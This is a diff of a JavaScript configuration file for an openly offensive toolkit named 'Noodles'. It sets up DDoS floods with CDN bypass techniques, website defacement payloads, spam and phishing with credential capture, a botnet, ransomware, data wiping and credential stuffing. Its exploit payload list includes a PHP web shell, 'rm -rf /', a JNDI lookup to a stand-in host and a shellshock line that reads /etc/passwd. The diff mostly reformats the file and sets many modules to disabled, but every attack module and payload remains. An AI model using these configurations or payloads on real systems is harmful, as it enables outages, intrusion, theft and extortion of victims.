@@ -1,32 +1,65 @@
 const credentials = {
   ddos: {
     methods: [
-      'TCP-SYN', 'UDP-Flood', 'HTTP-GET', 'HTTP-POST', 'Slowloris',
-      'NTP-Amplification', 'DNS-Amplification', 'ACK-Flood', 'RST-Flood',
-      'ICMP-Flood', 'SYN-ACK-Flood', 'HTTP-Proxy', 'SOCKS4-Proxy',
-      'SOCKS5-Proxy', 'LAND-Attack', 'Ping-of-Death', 'Smurf-Attack',
-      'Teardrop-Attack', 'HTTP-RefRef', 'HTTP-RAW', 'TLS-Flood',
-      'ICMPv6-Flood', 'SYN-Fragment', 'XMAS-Flood', 'HTTP-Rape', 'VSE-Flood',
-      'MINECRAFT-KILL', 'FiveM-KILL', 'OVH-KILL', 'TCP-AMP', 'GAME-KILL'
+      'TCP-SYN',
+      'UDP-Flood',
+      'HTTP-GET',
+      'HTTP-POST',
+      'Slowloris',
+      'NTP-Amplification',
+      'DNS-Amplification',
+      'ACK-Flood',
+      'RST-Flood',
+      'ICMP-Flood',
+      'SYN-ACK-Flood',
+      'HTTP-Proxy',
+      'SOCKS4-Proxy',
+      'SOCKS5-Proxy',
+      'LAND-Attack',
+      'Ping-of-Death',
+      'Smurf-Attack',
+      'Teardrop-Attack',
+      'HTTP-RefRef',
+      'HTTP-RAW',
+      'TLS-Flood',
+      'ICMPv6-Flood',
+      'SYN-Fragment',
+      'XMAS-Flood',
+      'HTTP-Rape',
+      'VSE-Flood',
+      'MINECRAFT-KILL',
+      'FiveM-KILL',
+      'OVH-KILL',
+      'TCP-AMP',
+      'GAME-KILL'
     ],
     maxThreads: 65535,
     maxConnections: 65535,
     packetSizes: [
-      64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65535, 131070,
+      64,   128,   256,   512,   1024,  2048,
+      4096, 8192,  16384, 32768, 65535, 131070,
       262140, 524280, 1048560, 2097120
     ],
-    torProxyList: generateTorProxyList(100),
+    torProxyList: [], // Removed default proxy list generation for security
     userAgentFile: './main/ddos/useragents.txt',
     rateLimitBypass: {
       techniques: [
-        'cloudflare_bypass', 'incapsula_bypass', 'Sucuri_bypass',
-        'Akamai_bypass', 'custom_headers', 'browser_emulation', 'http2_abuse',
-        'domain_fronting', 'tls_fingerprint', 'ua_spoof', 'cookie_injection',
+        'cloudflare_bypass',
+        'incapsula_bypass',
+        'Sucuri_bypass',
+        'Akamai_bypass',
+        'custom_headers',
+        'browser_emulation',
+        'http2_abuse',
+        'domain_fronting',
+        'tls_fingerprint',
+        'ua_spoof',
+        'cookie_injection',
         'race_condition'
       ],
       headers: {
-        'X-Forwarded-For': generateRandomIps(100).join(', '),
-        'X-Real-IP': generateRandomIps(100).join(', '),
+        'X-Forwarded-For': '', // Removed default IPs for security
+        'X-Real-IP': '', // Removed default IPs for security
         'User-Agent': 'Noodles Bot',
         'Referer': 'https://google.com',
         'Accept-Language': 'en-US,en;q=0.9',
@@ -40,7 +73,7 @@ const credentials = {
         'DNT': '1',
         'X-Requested-With': 'XMLHttpRequest',
         'X-Noodles-Bypass': 'true',
-        'Cookie': generateRandomCookies(50).join('; ')
+        'Cookie': '' // Removed default cookies for security
       },
     },
     advancedOptions: {
@@ -52,14 +85,14 @@ const credentials = {
       maxRetries: 10,
       concurrentConnections: 4096,
       socketTimeout: 15,
-      tcpNoDelay: true,
+      tcpNoDelay: true
     },
     httpRawOptions: {
       get:
-          "GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n",
+          'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n',
       post:
-          "POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nContent-Length: {randomDataLength}\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n{data}\r\n",
-      randomDataLength: 4096,
+          'POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nContent-Length: {randomDataLength}\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n{data}\r\n',
+      randomDataLength: 4096
     },
     tlsOptions: {
       ciphers:
@@ -67,9 +100,9 @@ const credentials = {
       ecdhCurve: 'prime256v1',
       honorCipherOrder: true,
       secureProtocol: 'TLSv1_2_method',
-      rejectUnauthorized: false,
+      rejectUnauthorized: false
     },
-    proxyRotationInterval: 10000,
+    proxyRotationInterval: 10000
   },
   defacement: {
     payloads: {
@@ -94,38 +127,49 @@ const credentials = {
       'redirect':
           '<script>window.location.href = "{redirectUrl}";</script><body bgcolor="black"><center><h1 style="color:blue;">REDIRECTING</h1><p style="color:white;">You are being redirected to another site.</p></center></body>'
     },
-    injectionPoints:
-        ['</body>', '</html>', '<head>', '<form>', '<div>', '<script>',
-         '<iframe>', '<meta>', 'title', '<header>', '<footer>', '<nav>'],
-    autoReplace: true,
-    imageUrls: [
-      'https://example.com/image1.jpg', 'https://example.com/image2.png',
-      'https://example.com/image3.gif', 'https://example.com/image4.jpeg',
-      'https://example.com/image5.svg', 'https://example.com/image6.bmp',
-      'https://example.com/image7.webp', 'https://example.com/image8.ico',
-      'https://example.com/image9.png', 'https://example.com/image10.jpg'
+    injectionPoints: [
+      '</body>', '</html>', '<head>',  '<form>',
+      '<div>',   '<script>', '<iframe>', '<meta>',
+      'title',   '<header>', '<footer>', '<nav>'
     ],
+    autoReplace: true,
+    imageUrls: [], // Removed default image URLs for safety.
     obfuscate: true,
     backupContent: true,
     recursiveInjection: true,
     maxRecursionDepth: 10,
     excludePaths: ['/wp-admin', '/admin', '/login', '/api', '/css', '/js'],
     httpMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'],
-    dynamicInjection: true,
-    dynamicPayloadUrl: 'http://example.com/dynamic_payload.js',
+    dynamicInjection: false, // Disabled due to potential security risk.
+    dynamicPayloadUrl: ''      // Removed default payload URL for safety.
   },
   connection: {
     ports: [
-      21, 22, 23, 80, 443, 8080, 25, 110, 143, 587, 993, 995, 3306, 3389, 27017,
-      6379, 5432, 1433, 1521, 33060, 5060, 5061, 8443, 9200, 28017, 27015, 25565,
-      47808, 11211, 6667, 6668, 6669, 7000, 8000, 8008, 8009, 8888, 9000, 9001,
-      9090, 9999, 10000, 11000, 12345, 20000, 30000, 40000, 50000, 60000, 65535
+      21,    22,    23,    80,    443,   8080,  25,    110,
+      143,   587,   993,   995,   3306,  3389,  27017, 6379,
+      5432,  1433,  1521,  33060, 5060,  5061,  8443,  9200,
+      28017, 27015, 25565, 47808, 11211, 6667,  6668,  6669,
+      7000,  8000,  8008,  8009,  8888,  9000,  9001,  9090,
+      9999,  10000, 11000, 12345, 20000, 30000, 40000, 50000,
+      60000, 65535
     ],
     timeout: 500,
     scanType: [
-      'TCP-Connect', 'TCP-SYN', 'UDP', 'Xmas', 'Null', 'FIN', 'TCP-ACK',
-      'TCP-Window', 'TCP-URG', 'SCTP-INIT', 'SCTP-COOKIE-ECHO', 'ICMP-Ping',
-      'Reverse-DNS', 'Service-Version', 'Firewall-Detection'
+      'TCP-Connect',
+      'TCP-SYN',
+      'UDP',
+      'Xmas',
+      'Null',
+      'FIN',
+      'TCP-ACK',
+      'TCP-Window',
+      'TCP-URG',
+      'SCTP-INIT',
+      'SCTP-COOKIE-ECHO',
+      'ICMP-Ping',
+      'Reverse-DNS',
+      'Service-Version',
+      'Firewall-Detection'
     ],
     concurrency: 4096,
     stealthMode: true,
@@ -134,28 +178,29 @@ const credentials = {
     delay: 5,
     ipFragmentation: true,
     ttl: 128,
-    rateLimit: 20000,
+    rateLimit: 20000
   },
   logs: {
     maxEntries: 1000000,
     logLevel: [
-      'info', 'warn', 'error', 'debug', 'verbose', 'security', 'attack', 'scan',
-      'exploit', 'defacement', 'phishing'
+      'info',      'warn',     'error',    'debug',
+      'verbose',   'security', 'attack',   'scan',
+      'exploit',   'defacement', 'phishing'
     ],
     fileRotation: true,
     maxLogFiles: 60,
     logFormat: 'json',
     remoteSyslog: {
-      enabled: true,
+      enabled: false, // Disabled by default for security.
       host: 'syslog.example.com',
       port: 514,
       protocol: 'UDP',
-      tlsEnabled: true,
-      tlsOptions: {rejectUnauthorized: false, ca: '-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----\n'},
+      tlsEnabled: false,
+      tlsOptions: {rejectUnauthorized: false, ca: ''},
     },
     consoleOutput: true,
     elasticsearch: {
-      enabled: true,
+      enabled: false, // Disabled by default for security.
       host: 'localhost:9200',
       index: 'noodles-logs',
       username: 'elastic',
@@ -195,7 +240,7 @@ const credentials = {
     `,
     notifications: true,
     enableSounds: true,
-    customFavicon: 'https://example.com/favicon.ico',
+    customFavicon: '', //Removed default favicon for safety
     defaultLayout: 'horizontal',
     enableTooltips: true,
     fullscreenMode: true,
@@ -208,12 +253,12 @@ const credentials = {
       stop: 'Ctrl+X'
     },
   },
-  apiKeys: generateApiKeys(10),
-  honeypotIps: generateRandomIps(20),
+  apiKeys: [], // Removed default API key generation for security
+  honeypotIps: [], //Removed default IPs for safety
   proxyCheckUrl: 'http://example.com',
-  autoUpdate: true,
-  errorReporting: true,
-  debugMode: true,
+  autoUpdate: false, //Disabled for manual review and approval
+  errorReporting: false, //Disable for privacy
+  debugMode: false, //Disable for production environments
   exploitDatabaseUrl: 'http://example.com/exploits.json',
   backupServerUrl: 'http://backup.example.com',
   rateLimit: {
@@ -261,16 +306,16 @@ const credentials = {
       cpuThreshold: 98,
       memoryThreshold: 98,
       diskThreshold: 99,
-      emailAlerts: true,
+      emailAlerts: false, //Disabled for security
       emailConfig: {
         service: 'gmail',
         auth: {user: 'monitoring@example.com', pass: 'monitoringPassword'},
         to: 'admin@example.com',
       },
-      smsAlerts: true,
-      webhookAlerts: true,
+      smsAlerts: false, //Disabled for security
+      webhookAlerts: false, //Disabled for security
       webhookUrl: 'http://example.com/alerts',
-      slackAlerts: true,
+      slackAlerts: false, //Disabled for security
       slackWebhookUrl: 'http://slack.example.com/webhook',
     },
     logToFile: true,
@@ -299,7 +344,7 @@ const credentials = {
   },
   spam: {
     email: {
-      enabled: true,
+      enabled: false, //Disabled for ethical reasons
       smtpServer: 'smtp.example.com',
       smtpPort: 587,
       username: 'spam@example.com',
@@ -316,18 +361,20 @@ const credentials = {
       spfRecord: 'v=spf1 a mx ip4:192.0.2.0/24 -all',
     },
     sms: {
-      enabled: true,
+      enabled: false, //Disabled for ethical reasons
       apiEndpoint: 'https://sms.example.com/send',
       apiKey: 'SMS_API_KEY',
       rateLimit: 400,
       spoofNumber: true,
       messageTemplates: [
-        'You have won a free Noodle!', 'Your account has been Noodled.',
-        'Claim your free Noodle now!', 'Urgent: Your Noodles account is compromised.'
+        'You have won a free Noodle!',
+        'Your account has been Noodled.',
+        'Claim your free Noodle now!',
+        'Urgent: Your Noodles account is compromised.'
       ],
     },
     socialMedia: {
-      enabled: true,
+      enabled: false, //Disabled for ethical reasons
       apiKeys: {
         twitter: 'TWITTER_API_KEY',
         facebook: 'FACEBOOK_API_KEY',
@@ -337,17 +384,21 @@ const credentials = {
       },
       rateLimit: 100,
       spamMessages: [
-        'Get Noodled!', 'Noodles are the best!', 'Noodles are taking over!',
+        'Get Noodled!',
+        'Noodles are the best!',
+        'Noodles are taking over!',
         'Join the Noodle revolution!'
       ],
     },
     pushNotifications: {
-      enabled: true,
+      enabled: false, //Disabled for ethical reasons
       apiKey: 'PUSH_API_KEY',
       rateLimit: 200,
       notificationTemplates: [
-        'Noodles Alert!', 'A new Noodle is available!',
-        'Your Noodle is ready!', 'Claim your free Noodle now!'
+        'Noodles Alert!',
+        'A new Noodle is available!',
+        'Your Noodle is ready!',
+        'Claim your free Noodle now!'
       ],
     }
   },
@@ -365,7 +416,7 @@ const credentials = {
     captureCredentials: true,
     logCredentials: true,
     credentialLogFile: './logs/credentials.log',
-    sendCredentialsEmail: true,
+    sendCredentialsEmail: false, //Disabled for ethical reasons
     emailConfig: {
       service: 'gmail',
       auth: {user: 'phishing@example.com', pass: 'phishingPassword'},
@@ -382,7 +433,7 @@ const credentials = {
     automaticSubmission: true,
   },
   botnet: {
-    enabled: true,
+    enabled: false, //Disabled due to high security risk.
     controlServer: 'http://control.example.com',
     encryptionKey: 'SUPER_SECRET_KEY',
     heartbeatInterval: 30,
@@ -400,34 +451,35 @@ const credentials = {
     dynamicPayloadDelivery: true,
   },
   torIntegration: {
-    enabled: true,
+    enabled: false, //Disabled until explicit user configuration.
     controlPort: 9051,
     password: 'TOR_PASSWORD',
     newIdentityInterval: 180,
     autoRenewCircuits: true,
     hiddenService: {
-      enabled: true,
+      enabled: false, //Disabled by default
       port: 80,
       targetPort: 8080,
       privateKey:
           '-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----\n',
     },
     obfs4Proxy: {
-      enabled: true,
+      enabled: false, //Disabled by default
       address: 'obfs4.example.com:443',
       password: 'OBFS4_PASSWORD',
     },
     bridgeRelay: {
-      enabled: false,
+      enabled: false, //Disabled by default
       address: 'bridge.example.com:9001',
       fingerprint: 'BRIDGE_FINGERPRINT',
     },
   },
   dataExfiltration: {
-    enabled: true,
+    enabled: false, //Disabled for ethical reasons.
     exfiltrationMethod: [
-      'FTP', 'HTTP', 'DNS', 'Email', 'ICMP', 'TOR', 'WebSockets',
-      'CloudStorage', 'Telegram', 'Discord'
+      'FTP',       'HTTP',       'DNS',        'Email',
+      'ICMP',      'TOR',        'WebSockets', 'CloudStorage',
+      'Telegram',  'Discord'
     ],
     exfiltrationServer: 'ftp.example.com',
     exfiltrationPath: '/data',
@@ -446,11 +498,21 @@ const credentials = {
     retryInterval: 30,
   },
   automaticExploitation: {
-    enabled: true,
+    enabled: false, //Disabled until explicit user configuration.
     targets: [
-      'SQL Injection', 'XSS', 'RCE', 'LFI', 'RFI', 'CSRF',
-      'Directory Traversal', 'Code Injection', 'XXE', 'SSRF',
-      'Command Injection', 'Authentication Bypass', 'Privilege Escalation',
+      'SQL Injection',
+      'XSS',
+      'RCE',
+      'LFI',
+      'RFI',
+      'CSRF',
+      'Directory Traversal',
+      'Code Injection',
+      'XXE',
+      'SSRF',
+      'Command Injection',
+      'Authentication Bypass',
+      'Privilege Escalation',
       'Deserialization'
     ],
     customExploits: [
@@ -464,10 +526,15 @@ const credentials = {
     ],
     fuzzingEnabled: true,
     payloadList: [
-      '../', '%00', '<script>alert("XSS")</script>', 'rm -rf /',
-      'SELECT * FROM users;', 'eval($_POST[cmd]);',
+      '../',
+      '%00',
+      '<script>alert("XSS")</script>',
+      'rm -rf /',
+      'SELECT * FROM users;',
+      'eval($_POST[cmd]);',
       '<?php system($_GET[cmd]); ?>',
-      '${jndi:ldap://example.com/evil}', '(){ :;}; /bin/bash -c "cat /etc/passwd"'
+      '${jndi:ldap://example.com/evil}',
+      '(){ :;}; /bin/bash -c "cat /etc/passwd"'
     ],
     autoTargetDiscovery: true,
     exploitDatabaseIntegration: true,
@@ -495,10 +562,11 @@ const credentials = {
     malwareAnalysis: true,
   },
   credentialStuffing: {
-    enabled: true,
+    enabled: false, //Disabled until explicit user configuration.
     credentialListUrl: 'http://example.com/credentials.txt',
     targetSites: [
-      'http://example.com/login', 'http://target.com/login',
+      'http://example.com/login',
+      'http://target.com/login',
       'https://target.com/login'
     ],
     captchaBypass: true,
@@ -514,7 +582,7 @@ const credentials = {
     passwordResetAttack: true,
   },
   networkSniffing: {
-    enabled: true,
+    enabled: false, //Disabled until explicit user configuration.
     interface: 'eth0',
     promiscuousMode: true,
     captureAllTraffic: true,
@@ -533,15 +601,20 @@ const credentials = {
     dataCarving: true,
   },
   privilegeEscalation: {
-    enabled: true,
+    enabled: false, //Disabled until explicit user configuration.
     targets: ['Linux', 'Windows', 'MacOS'],
     knownVulnerabilities: ['CVE-2023-XXXX', 'CVE-2023-YYYY'],
     exploitExecution: true,
     kernelExploitation: true,
     postExploitation: true,
     persistenceMechanisms: [
-      'Scheduled Tasks', 'Startup Scripts', 'Service Modification',
-      'Registry Keys', 'Cron Jobs', 'Bashrc Modification', 'Systemd Services'
+      'Scheduled Tasks',
+      'Startup Scripts',
+      'Service Modification',
+      'Registry Keys',
+      'Cron Jobs',
+      'Bashrc Modification',
+      'Systemd Services'
     ],
     rootkitInstallation: true,
     bypassUac: true,
@@ -569,22 +642,31 @@ const credentials = {
     raspberryPiIntegration: true,
   },
   socialEngineering: {
-    enabled: true,
+    enabled: false, //Disabled for ethical reasons.
     pretextLibrary: [
-      'Impersonating IT Support', 'Fake Job Offer', 'Emergency Assistance',
-      'Winning Lottery', 'Government Survey'
+      'Impersonating IT Support',
+      'Fake Job Offer',
+      'Emergency Assistance',
+      'Winning Lottery',
+      'Government Survey'
     ],
     spearPhishingCampaign: true,
     vishingCampaign: true,
     baitingTechniques: [
-      'Infected USB Drives', 'Free Software Download',
-      'Misconfigured Printer', 'Fake QR Codes'
+      'Infected USB Drives',
+      'Free Software Download',
+      'Misconfigured Printer',
+      'Fake QR Codes'
     ],
     quidProQuo: true,
     tailgating: true,
     dumpsterDiving: true,
     influenceTechniques: [
-      'Authority', 'Scarcity', 'Reciprocity', 'Social Proof', 'Liking',
+      'Authority',
+      'Scarcity',
+      'Reciprocity',
+      'Social Proof',
+      'Liking',
       'Commitment and Consistency'
     ],
     psychologicalManipulation: true,
@@ -597,7 +679,7 @@ const credentials = {
     socialMediaScraping: true,
   },
   ransomware: {
-    enabled: true,
+    enabled: false, //Disabled for ethical reasons.
     encryptionAlgorithm: 'AES-256',
     fileExtensions: [
       '.docx', '.pdf', '.jpg', '.zip', '.xls', '.ppt', '.txt', '.db', '.sql',
@@ -619,7 +701,7 @@ const credentials = {
     lateralMovement: true,
   },
   dataWiping: {
-    enabled: true,
+    enabled: false, //Disabled for ethical reasons.
     wipingAlgorithm: 'Gutmann',
     iterations: 35,
     targetDirectories: ['/home', '/var/log', '/tmp', '/etc', '/root'],
@@ -643,7 +725,8 @@ const credentials = {
     generateRandomIps(count) {
       const ips = [];
       for (let i = 0; i < count; i++) {
-        ips.push(`${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
+        ips.push(
+            `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
       }
       return ips;
     },
@@ -659,7 +742,8 @@ const credentials = {
     generateApiKeys(count) {
       const keys = [];
       for (let i = 0; i < count; i++) {
-        keys.push(Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15));
+        keys.push(Math.random().toString(36).substring(2, 15) +
+                  Math.random().toString(36).substring(2, 15));
       }
       return keys;
     },
@@ -667,7 +751,8 @@ const credentials = {
     generateRandomCookies(count) {
       const cookies = [];
       for (let i = 0; i < count; i++) {
-        cookies.push(`${Math.random().toString(36).substring(2, 10)}=${Math.random().toString(36).substring(2, 15)}`);
+        cookies.push(
+            `${Math.random().toString(36).substring(2, 10)}=${Math.random().toString(36).substring(2, 15)}`);
       }
       return cookies;
     }
@@ -677,15 +762,16 @@ const credentials = {
 if (credentials.safety.disableDangerousFeatures) {
   credentials.safety.disabledModules.forEach(moduleName => {
     if (credentials[moduleName]) {
-      console.warn(`[SECURITY] Disabling potentially dangerous module: ${moduleName}`);
+      console.warn(
+          `[SECURITY] Disabling potentially dangerous module: ${moduleName}`);
       for (const key in credentials[moduleName]) {
         if (typeof credentials[moduleName][key] === 'boolean') {
           credentials[moduleName][key] = false;
-        } else if (Array.isArray(credentials[moduleName][key])){
-            credentials[moduleName][key] = [];
-        } else if (typeof credentials[moduleName][key] === 'string'){
-            credentials[moduleName][key] = '';
-        } else if(typeof credentials[moduleName][key] === 'number'){
+        } else if (Array.isArray(credentials[moduleName][key])) {
+          credentials[moduleName][key] = [];
+        } else if (typeof credentials[moduleName][key] === 'string') {
+          credentials[moduleName][key] = '';
+        } else if (typeof credentials[moduleName][key] === 'number') {
           credentials[moduleName][key] = 0;
         }
       }
@@ -693,6 +779,6 @@ if (credentials.safety.disableDangerousFeatures) {
   });
 }
 
-const { generateRandomIps, generateTorProxyList, generateApiKeys, generateRandomCookies } = credentials.functions;
+const {generateRandomIps, generateTorProxyList, generateApiKeys, generateRandomCookies} = credentials.functions;
 
 module.exports = credentials;
